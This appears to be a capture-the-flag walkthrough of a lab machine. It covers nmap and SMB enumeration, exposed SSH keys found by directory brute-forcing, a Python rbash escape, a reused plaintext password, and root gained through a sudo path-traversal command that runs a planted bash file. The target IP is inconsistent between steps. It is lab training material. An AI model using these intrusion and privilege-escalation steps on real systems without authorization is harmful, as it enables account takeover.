# Samurai

## Nmap

```
sudo nmap 192.168.104.90 -p- -sS -sV

PORT     STATE SERVICE       VERSION
21/tcp   open  ftp           vsftpd 3.0.3
22/tcp   open  ssh           OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
80/tcp   open  http          nginx 1.14.2
139/tcp  open  netbios-ssn   Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn   Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
7080/tcp open  ssl/empowerid LiteSpeed
7601/tcp open  http          Apache httpd 2.4.38 ((Debian))
8088/tcp open  http          LiteSpeed httpd
Service Info: Host: SEPPUKU; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

Starting off on this machine we find that port 80 is restricted by a HTTP-basic-auth login.

![](<../../../.gitbook/assets/image (1146).png>)

I decided against bruteforcing for the moment and move straight on to other ports on the machine. Looking at port 445 for SMB I run enum4linux against the target and discovered some user accounts.

```
enum4linux -u '' -p '' -a 192.168.104.90 
```

![](<../../../.gitbook/assets/image (1147).png>)

We have discovered the following users:\\

* seppuku
* samurai
* tanto

Otherwise with no open shares on SMB we move onto enumerating port 7601 of which in the browser takes us to the following below:

![](<../../../.gitbook/assets/image (1148).png>)

Running `dirsearch.py` against this port reveals the /keys/ directory.

```
python3 dirsearch.py -u http://192.168.104.90:7601  -w /usr/share/seclists/Discovery/Web-Content/common.txt -t 60 --full-url
```

![](<../../../.gitbook/assets/image (1151).png>)

![](<../../../.gitbook/assets/image (1149).png>)

Private and private.bak contain RSA keys. I moved the key over to my desktop, renamed to id\_rsa and used `chmod` to set appropriate permissions.

```
chmod 600 id_rsa
```

Knowing of the three users on the target machine we can guess and login to `SSH`. I was able to login with the user tanto.

```
ssh -i id_rsa tanto@192.168.172.90 
```

![](<../../../.gitbook/assets/image (1152).png>)

Once logged in as tanto we see we are restricted in `rbash` and unable to run some commands. I used the following command sequence to first escape `rbash` then export a new path then finally updated to a Python shell again.

```
python -c 'import os; os.system("/bin/sh")'
PATH=/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin
python -c 'import pty; pty.spawn("/bin/bash")'
```

Once we can move around the box again I moved into the seppuku users directory. The file .passwd is of interest and contains the password: `12345685213456!@!@A`

This password did not work for the user seppku but I was able to use `su` and the password to login as the user samurai.

![](<../../../.gitbook/assets/image (1153) (1).png>)

![](<../../../.gitbook/assets/image (1154).png>)

I then transferred linpeas over to the attacking machine which soon picked up sudo permissions.

![](<../../../.gitbook/assets/image (1155).png>)

Open another tab and log in as tanto on `SSH` again. The create the directory and file so we can execute as the user samurai. Once the directory and bin file has been created echo in a bash shell then `chmod` to make it executable.

```
mkdir .cgi_bin
cd .cgi_bin
echo '/bin/bash' > bin
chmod 755 bin
```

![](<../../../.gitbook/assets/image (1156).png>)

Then on our other tab execute the file with the following command to gain root shell:

```
sudo /../../../../../../home/tanto/.cgi_bin/bin /tmp/*
```

![](<../../../.gitbook/assets/image (1157).png>)
